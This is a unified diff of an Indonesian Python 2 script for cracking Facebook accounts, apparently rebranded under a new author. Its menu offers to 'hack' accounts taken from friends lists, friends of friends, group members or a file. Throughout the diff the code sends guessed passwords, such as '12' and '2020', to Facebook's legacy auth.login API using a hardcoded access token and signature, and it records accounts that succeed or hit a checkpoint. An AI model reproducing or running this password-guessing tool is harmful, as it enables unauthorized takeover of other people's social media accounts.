@@ -54,8 +54,8 @@ logo = """ \x1b[1;97m█████████
  \x1b[1;97m█████████        \x1b[1;96m«----------✧----------»
  \x1b[1;97m ██ ██
  \x1b[1;97m╔════════════════════════════════════════════╗
- \x1b[1;97m║ \x1b[1;93m* \x1b[1;97mAuthor \x1b[1;91m: \x1b[1;96mMaulana Gans    \x1b[1;97m                   ║
- \x1b[1;97m║ \x1b[1;93m* \x1b[1;97mYT \x1b[1;91m: \x1b[1;92m\x1b[44m Maulana Gans \x1b[0m\x1b[1;97m║
+ \x1b[1;97m║ \x1b[1;93m* \x1b[1;97mAuthor \x1b[1;91m: \x1b[1;96mUjang Sapari    \x1b[1;97m                   ║
+ \x1b[1;97m║ \x1b[1;93m* \x1b[1;97mYT \x1b[1;91m: \x1b[1;92m\x1b[44m AndroidTop4 \x1b[0m\x1b[1;97m║
  \x1b[1;97m╚════════════════════════════════════════════╝"""
  
 
@@ -78,14 +78,14 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mMau gk jadi pacar aku ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mSiapa nama Anda ? \033[1;91m: \033[1;92m")
 	if nama =="":
 		print"\033[1;96m[!] \033[1;91mIsi yang benar"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJangan lupa bahagia boskuh semoga yg udh subscribe channel gw hari mu menyenangkan:) !!")
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJangan Lupa bahagia untuk hari Ini:) !!")
 		time.sleep(1)
 		loginSC()
 		
@@ -93,16 +93,16 @@ def siapa():
 def loginSC():
 	os.system('clear')
 	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu bro,kalau gak tau Lisensinya,silahkan liat di vidio youtube gw.!\n"
-	os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
+	os.system('')
         username = raw_input("\033[1;96m[*] \033[1;97mID \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="maulana" and password =="ganteng":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
+	if username =="Ujang" and password =="Kasep":
+		print"\033[1;96m[✓] \033[1;92mLogin berhasil"
 		time.sleep(1)
 		login()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah Bosku!!"
-		os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
+		os.system('')
                 time.sleep(1)
                 LoginSC()
 
@@ -115,7 +115,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN AKUN FACEBOOK BRO \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -153,7 +153,7 @@ def login():
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
-			os.system('xdg-open https://m.youtube.com/channel/UCdFntu_iZKLjF5rJGcFFGyg')
+			os.system('')
 			time.sleep(1)
 			keluar()
 		else:
@@ -237,10 +237,10 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[32;1m1.\x1b[0;1m Crack dari daftar teman"
-	print "\x1b[32;1m2.\x1b[0;1m Crack dari teman dari teman"
-	print "\x1b[32;1m3.\x1b[0;1m Crack dari member grup"
-	print "\x1b[32;1m4.\x1b[0;1m Crack dari file"
+	print "\x1b[32;1m1.\x1b[0;1m Hack dari daftar teman"
+	print "\x1b[32;1m2.\x1b[0;1m Hack dari teman dari teman"
+	print "\x1b[32;1m3.\x1b[0;1m Hack dari member grup"
+	print "\x1b[32;1m4.\x1b[0;1m Hack dari file"
 	print "\n\x1b[32;1m0.\x1b[33;1m Kembali"
 	pilih_super()
 
@@ -317,7 +317,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✓\033[1;96m] \033[32;1mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[0;1mSabar om,orang sabar di sayang janda')
+	print('\x1b[1;96m[!] \x1b[0;1mSabar bro,orng sabar di sayang tuhan')
 	print 42*"\033[1;96m="
 	
 			
@@ -379,7 +379,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'sembiring'
+									pass4 = '12'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -412,7 +412,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'doraemon'
+													pass6 = '2020'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
